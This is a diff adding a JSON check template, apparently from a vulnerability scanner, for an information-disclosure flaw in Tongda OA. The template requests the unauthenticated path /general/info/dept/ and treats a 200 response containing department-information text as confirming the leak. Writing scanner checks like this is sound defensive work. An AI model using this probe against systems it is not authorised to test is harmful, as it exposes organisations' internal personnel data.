@@ -1,0 +1,33 @@
+{
+  "product": "通达OA",
+  "vul_name": "通达OA general_info_dept 敏感信息泄漏",
+  "type": "信息泄漏",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "通达OA /general/info/dept/存在敏感信息泄漏",
+  "version": "",
+  "note": "",
+  "search": {},
+  "protocol": "http",
+  "link": "https://www.cnblogs.com/null1433/p/12768901.html",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/general/info/dept/"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "部门/成员单位信息"
+        }
+      ]
+    }
+  }
+}
